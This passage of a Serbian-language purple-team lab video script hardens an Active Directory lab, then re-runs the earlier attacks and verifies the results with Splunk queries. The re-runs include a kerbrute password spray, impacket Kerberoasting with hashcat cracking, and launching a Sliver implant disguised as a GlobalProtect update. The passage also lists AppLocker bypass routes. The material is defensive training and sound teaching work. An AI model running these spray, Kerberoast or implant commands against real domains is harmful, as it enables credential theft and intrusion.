    match('Process Command Line', "InstallUtil"), "T1218.004 - LOLBin",
    match('Process Command Line', "reg.*save"), "T1003.002 - SAM Dump",
    true(), "Other"
)
| where mitre != "Other"
| stats count by mitre
| sort - count
```

- **T1046** — Network Service Discovery (nmap, kerbrute)
- **T1087** — Account Discovery (BloodHound)
- **T1110.003** — Password Spraying
- **T1558.003** — Kerberoasting
- **T1218.004** — InstallUtil LOLBin
- **T1071.001** — Web Protocols C2 (Sliver mTLS)
- **T1003.002** — SAM dump
- **T1053.005** — Scheduled Task
- **T1041** — Exfiltration over C2 Channel

#### 🎯 Pro Tip #30 — ATT&CK Navigator
> "ATT&CK Navigator je sledeći nivo vizualizacije. Web alat gde mapirate sve detekcije iz SIEM-a na heat map i vidite coverage gap-ove — tehnike za koje nemate ni jedan alert. U realnom enterprise-u, ovo je deo godišnjeg detection engineering review-a. Mature SOC ima 80%+ coverage Enterprise Matrix-a. Na kraju ovog videa ću staviti link na moj Navigator export."

### Lessons Learned

> "Šta je ovaj lab pokazao."

> "Prvo — Defense in Depth radi. Defender + AMSI + AD permisije + audit policy + Sysmon — pet slojeva, svaki je zaustavio deo napada. Nijedan sam po sebi nije bio dovoljan, kombinacija je bila."

> "Drugo — service nalozi su najčešća slaba tačka. Slaba lozinka u description, slaba lozinka na SPN-u, password never expires. Ovo je 50% AD pentest nalaza u praksi."

> "Treće — default konfiguracija nije dovoljna. Sysmon default ima detection gap. Audit policy default ne loguje scheduled task-ove. Detection engineering nije 'instaliraj alat' — je kontinuiran iterativan proces."

> "Četvrto — purple team pristup je superiorniji od pure red ili pure blue tima. Simuliraj napad, izmeri detection, popravi gap, ponovi. To je metodologija koja je transformisala SOC operacije."

#### 🎯 Pro Tip #31 — Sledeći korak: Threat Hunting
> "Šta je moj sledeći korak posle ovog laba? Threat hunting. Ne čekati alert — proaktivno pretraživati indikatore kompromisa. Primer hypothesis koji bih postavio — 'Da li u mreži postoji service nalog sa SPN-om, weak encryption typeom, password never expires, i lozinkom u description polju?' Jedan kombinirani SPL query pokriva sve. To je razlika između reactive SOC analitičara i proaktivnog — L2 koji predviđa napad, ne samo reaguje. O tome pričam u sledećem videu."

### Anons — Segment 10

> "Pre nego što zaključim — jedna važna stvar. U Segment 10 ću uraditi nešto drugačije. Hardenizujem lab. Resetujem lozinke, force AES, deploy AppLocker, update Sysmon config. Onda ponavljam iste napade iz prethodnih segmenata."

> "Hipoteza — koji napadi će fail-ovati, koji će i dalje proći? I ključno pitanje — zašto detection layer i dalje ostaje potreban čak i posle hardening-a? To je purple team metodologija u svom najjačem izdanju."

### Zatvaranje

> "Hvala na gledanju. Ceo lab — komande, SPL upiti, detection cards, troubleshooting — dokumentovano na GitHub-u, link u opisu."

> "Ako imate pitanja ili želite da raspravimo neku fazu detaljnije — komentari su otvoreni. Šta bi voleli da vidite u sledećem videu — napišite dole."

---

## SEGMENT 10 — Production Hardening: Closing the Gaps (15-20 min) — BONUS

### Hook — Before/After Detection Engineering

> "Tokom prethodnih 8 segmenata svi napadi su prošli. fcastle:Password1 je krek za 2 minuta. SQLService je kerberoasted. Sliver je beaconao kroz mTLS na port 443. To je *before* slika."

> "Ovaj segment je *after*. Hardenizujemo lab, ponavljamo iste napade, i pokazujemo da fail-uju. Ali — i ovo je ključ — pokazujemo i zašto detection layer ostaje neophodan čak i nakon hardening-a."

> "Tri skill-a u jednom segmentu — threat understanding, prevention, i detection engineering. Tačno ono što SOC L2 i Detection Engineer role traže."

### Recap — Šta je prošlo

| Faza | Napad | Why It Worked |
|---|---|---|
| 2 | Password Spray fcastle:Password1 | Default password, no lockout enforcement |
| 4 | Kerberoasting SQLService | RC4 enc type, weak password, description leak |
| 5 | Sliver implant izvršen iz C:\Temp | Nema AppLocker/WDAC za user-writable path-ove |
| 8 | mTLS C2 beacon na port 443 | Default Sysmon ne hvata NetworkConnect iz C:\Temp |

> "Četiri napada. Idemo redom — fix, re-run, dokaz."

---

### Fix #1 — Faza 2 Password Spray → Fine-Grained Password Policy

**Hardening (na HYDRA-DC):**

```powershell
# Force strong passwords kroz Fine-Grained Password Policy
New-ADFineGrainedPasswordPolicy -Name "Strong-Users" `
  -Precedence 10 `
  -MinPasswordLength 14 `
  -ComplexityEnabled $true `
  -PasswordHistoryCount 24 `
  -LockoutThreshold 5 `
  -LockoutDuration "00:30:00" `
  -LockoutObservationWindow "00:30:00" `
  -ReversibleEncryptionEnabled $false

# Apply na Domain Users grupu
Add-ADFineGrainedPasswordPolicySubject -Identity "Strong-Users" -Subjects "Domain Users"

# Resetuj fcastle sa novom strong lozinkom
Set-ADAccountPassword -Identity fcastle -Reset -NewPassword (ConvertTo-SecureString "X9$mNp@2025vQ#kL" -AsPlainText -Force)
```

**Re-run napada (sa Kali):**

```bash
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt 'Password1' --delay 100
```

> "Spray ne radi. Password1 ne pogađa nijedan nalog. Nakon 5 pokušaja po useru — lockout 30 minuta. Napadač gubi i strpljenje i vreme."

**Splunk verifikacija:**

```spl
index=main source="WinEventLog:Security" EventCode=4740
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| table _time, username
```

> "EC4740 — Account Lockout event. Ovo je *fail signature* — kad vidite ovo, napadač je naleteo na lockout zid."

#### 🎯 Pro Tip #32 — Detection ostaje kritičan

> "Fine-grained password policy zaustavlja klasičan spray. Ali napadač sad zna lockout threshold — 5 pokušaja, 30 min reset. Sledeća iteracija — 'low and slow' spray sa 1 pokušaj po useru svakih 35 minuta. To prolazi lockout, ali pravi distinct pattern u Splunk-u — više različitih korisnika sa istog source IP-a u dugačkom vremenskom okviru. Detection layer hvata ono što prevention propušta. To je defense in depth."

---

### Fix #2 — Faza 4 Kerberoasting → AES Enforcement + Description Cleanup

**Hardening (na HYDRA-DC):**

```powershell
# Force AES-only encryption za SQLService
Set-ADUser -Identity SQLService -KerberosEncryptionType AES256

# Verifikacija
Get-ADUser SQLService -Properties msDS-SupportedEncryptionTypes |
  Select-Object SamAccountName, msDS-SupportedEncryptionTypes
# Output: 24 (= 0x18 = AES128 + AES256)

# Resetuj password sa strong random
Set-ADAccountPassword -Identity SQLService -Reset `
  -NewPassword (ConvertTo-SecureString "Tg7#nQ9pX@2vMw4kL!8jBr5" -AsPlainText -Force)

# Obriši password leak iz description polja
Set-ADUser -Identity SQLService -Description "SQL Service Account - DO NOT MODIFY"
```

**Re-run napada (sa Kali):**

```bash
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:NewPassword -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes
```

> "TGS hash i dalje dolazi — to je dizajn Kerberos protokola, nije bug. Ali pogledajte hash:"

```
$krb5tgs$18$SQLService$MARVEL.LOCAL$...
       ^^
       enc_type = 18 = AES256
```

```bash
hashcat -m 19700 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
```

> "AES256 TGS — hashcat mode 19700. Lozinka je 23-character random. Hashcat estimate: 47 godina. To nije realan napad u nikakvom enterprise life-cycle-u."

**Splunk verifikacija:**

```spl
index=main source="WinEventLog:Security" EventCode=4769
| rex field=Message "Ticket Encryption Type:\s*(?<enc_type>[^\r\n]+)"
| rex field=Message "Service Name:\s*(?<service>[^\r\n]+)"
| where enc_type="0x12"
| stats count by service, enc_type
```

> "Sad sve service tickets su 0x12 — AES256. RC4 request je sada anomalija, ne baseline. Detection threshold se okreće — RC4 sad alertuje *jer ne bi trebalo da postoji*."

#### 🎯 Pro Tip #33 — gMSA je sledeći nivo

> "AES + strong password rešava Kerberoasting, ali manuelno. gMSA — Group Managed Service Account — Windows automatski rotira lozinku svakih 30 dana, 256-character random. Aplikacija dobija lozinku preko API-ja, nikad ne vidi plaintext. To je Microsoft preporuka od Server 2012. Ako bi razgovor sa hiring manager-om dotakao AD security strategiju — gMSA migracija je *the* talking point."

---

### Fix #3 — Faza 5 Sliver Execution → AppLocker

**Hardening (na THEPUNISHER, kroz GPO):**

```powershell
# AppLocker rules - block execution iz user-writable path-ova
New-AppLockerPolicy -RuleType Path -User Everyone -Action Deny `
  -RulePath "C:\Temp\*","C:\Users\*\AppData\Local\Temp\*","C:\Users\Public\*" `
  -RuleNamePrefix "PurpleLab-Block" |
  Set-AppLockerPolicy -Merge

# Enable AppLocker service
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc

# Verifikacija
Get-AppLockerPolicy -Effective -Xml
```

**Re-run napada (sa Kali → THEPUNISHER):**

```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.exe C:\Temp\GlobalProtect_Update.exe
C:\Temp\GlobalProtect_Update.exe
```

*Output: "This program is blocked by group policy. For more information, contact your system administrator."*

> "AppLocker blokira pre nego što proces uopšte starta. Defender nije ni bio aktiviran — proces nikad nije zaživeo."

**Splunk verifikacija:**

```spl
index=main source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" EventCode=8004
| rex field=Message "was prevented from running\.\s*(?<reason>.*)"
| rex field=Message "(?<blocked_path>C:\\\\[^\s]+\.exe)"
| table _time, blocked_path, reason
```

> "EC8004 — AppLocker Block Event. Ovo je *gold* detection signal. Svaki put kad vidite ovo u SIEM-u, neko je pokušao da pokrene nešto iz user-writable lokacije. Pravo alarm-worthy event."

#### 🎯 Pro Tip #34 — AppLocker vs WDAC

> "AppLocker je dobar baseline ali nije bulletproof. Bypass-uje se kroz DLL hijack, signed binary abuse, ili PowerShell ConstrainedLanguageMode bypass. WDAC — Windows Defender Application Control — je nasledjnik. Kernel-level enforcement, hash-based whitelisting, ne može da se bypass-uje iz user-mode. Enterprise sa visokim security postureom (banke, defense contractors) koristi WDAC. AppLocker je 80% zaštite za 20% truda. WDAC je ostali 20% zaštite za 80% truda. Trade-off ide po threat model-u."

---

### Fix #4 — Faza 8 mTLS C2 Beacon → Sysmon NetworkConnect Watchlist

> "Ovo smo već demonstrirali u Segment 8 — ali ovde fokusiramo na permanent deployment kroz GPO."

**Hardening (Sysmon config — Group Policy deployment):**

```xml
<!-- sysmonconfig-v2-purple.xml -->
<NetworkConnect onmatch="include">
  <Image condition="begin with">C:\Temp\</Image>
  <Image condition="begin with">C:\Users\</Image>
  <Image condition="begin with">C:\ProgramData\</Image>
  <Image condition="end with">InstallUtil.exe</Image>
  <Image condition="end with">regsvr32.exe</Image>
  <Image condition="end with">mshta.exe</Image>
</NetworkConnect>
```

```cmd
:: Deploy kroz Group Policy startup script
sysmon64 -c "\\HYDRA-DC\NETLOGON\sysmonconfig-v2-purple.xml"
```

**Re-run napada (sa Kali):**

Sliver implant i dalje uspeva da starta (AppLocker fix je iz Fix #3 — pretpostavljamo ga je napadač zaobišao, recimo kroz LOLBin), ali sad...

**Splunk verifikacija:**

```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "DestinationIp:\s*(?<dst_ip>[^\r\n]+)"
| rex field=Message "DestinationPort:\s*(?<dst_port>[^\r\n]+)"
| search process="*Temp*"
| stats count by process, dst_ip, dst_port
| where count > 5
```

> "EC3 sad hvata svaki beacon iz C:\Temp. 60-sekundni interval Sliver-a je očigledan timeline pattern. Detection radi."

#### 🎯 Pro Tip #35 — Sysmon kao Detection-as-Code

> "Sysmon config je infrastrukturni kod. Version control u Git-u, version tag (v2.1-purple), deployment kroz GPO startup script ili Intune. Promene se testiraju u staging environment-u. Nikad ad-hoc na endpoint-u. Mature SOC ima Sysmon kao deo CI/CD pipeline-a — pull request review-ovi, automated testing, staged rollouts. Sve to ide u Sigma rule format takođe — vendor-neutral, deploy-uješ u Splunk, Sentinel, Elastic istom datotekom. Ako u CV-u napišeš 'Sigma rule format' — to već signalizira nivo iznad junior-a."

---

### Closing Insight — Hardening ≠ Detection

> "Pogledajmo finalnu sliku. Posle ova 4 fix-a:"

| Faza | Pre fixa | Posle fixa |
|---|---|---|
| 2 — Password Spray | fcastle:Password1 — uspeh za 30s | Lockout posle 5 pokušaja, password 47 god krek |
| 4 — Kerberoasting | RC4 hash krek za 17s | AES256, password 47 god krek |
| 5 — Sliver Execution | Implant radi iz C:\Temp | AppLocker blokira startup |
| 8 — mTLS Beacon | Sysmon ne vidi NetworkConnect | EC3 hvata svaki beacon |

> "Sva četiri napada — ili blokirana ili detektovana. Ali pažljivo. Nijedan od ovih kontrola nije bulletproof."

> "Spray može da postane low-and-slow. AES password može da curi iz description polja drugog naloga. AppLocker se bypass-uje kroz signed LOLBin. Sysmon watchlist propušta sve što nije u C:\Temp."

> "To je ključ. Prevention smanjuje napadački surface. Ali surface nikad nije nula. Detection je *safety net* za sve što prođe kroz prevention layer. Mature SOC ne bira jedno ili drugo — implementira oba, sa eksplicitnom svešću koji sloj brani od kog napada."

#### 🎯 Pro Tip #36 — L1 vs L2 vs L3 vocabulary

> "Završna misao za karijeru. Tri nivoa razumevanja:"

> "**L1 misli alate.** 'Imamo Splunk. Imamo Defender. Pokriveni smo.'"

> "**L2 misli metodologiju.** 'Detection-as-Code, gap analysis, false positive tuning, MITRE ATT&CK coverage.'"

> "**L3 misli strategiju.** 'Šta je naš threat model? Koje su krunske drago

cenosti? Gde su realistic attack paths? Kako je detection investment vs prevention investment optimizovan?'"

> "Ovaj segment ti je dao vokabular za L2 → L3 razgovor. Threat understanding + prevention + detection — sva tri sloja u 4 demoa. Koristi to u intervjuima."

### Šta sledeće — Lab v2

> "Ovaj lab je v1. Lab v2 dodaje:"

> "**NDR layer** — pfSense/OPNsense + Suricata/Zeek za pasivni network monitoring. JA3 fingerprinting za Sliver beacon. Detection iznad host-based."

> "**EDR layer** — Wazuh ili LimaCharlie open source EDR. Real-time process tree, behavioral analytics, superior over plain Sysmon."

> "**Threat Intel** — MISP platforma. IOC feed-ovi, automated enrichment alertova. Ono što razdvaja moderni SOC od onog iz 2015."

> "Sve tri ekstenzije su dodatni projekti za GitHub. Više razgovora za posao."

### Zatvaranje

> "Hvala što ste pratili Purple Team Home Lab seriju. Sve — komande, SPL, Sysmon config, AppLocker rules, hardening playbook — na GitHub-u, link u opisu."

> "Pitanja, predlozi, kritike — komentari su otvoreni. Idemo dalje."

---

## NAPOMENE ZA SNIMANJE

### Prezentacioni stil
- Tempo — ne brzaj, daj gledaocu vreme da pročita output
- Ton — kao objašnjavanje kolegi, ne kao predavanje
- Pauze — pre važnih wisdom drop-ova, build suspense
- Greške — ne izbacuj iz edita — pokaži kako rešavaš

### Ključne fraze za ponoviti kroz video
- "Defense in Depth" — bar 3x
- "Detection engineering" — bar 4x  
- "Purple team metodologija" — bar 3x
- "MITRE ATT&CK" — kroz sve segmente

### Vizuelni signali profesionalizma
- Multiple tabs — Splunk, Sliver, Kali, NARATIV
- Tab completion umesto kucanja
- `04_video_narrative.md` otvoren kao referenca
- Splunk time range podešen na pravi period
- Clean state — bez fajlova iz prošlih proba

### Šta ne treba biti vidljivo
- Slučajno otkrivene lozinke (osim SQLService description koji je svesno)
- Backup fajlovi od probe
- Personalni podaci, hostname-ovi van laba

---

**Total wisdom drops:** 36  
**Cilj svakog:** Pokazati dubinu razumevanja koja odvaja juniora od L2/L3.  
**Target audience signal:** Hiring manager koji zna AD security — ovi detalji pokazuju da ne samo koristite alate već razumete zašto i kako rade.
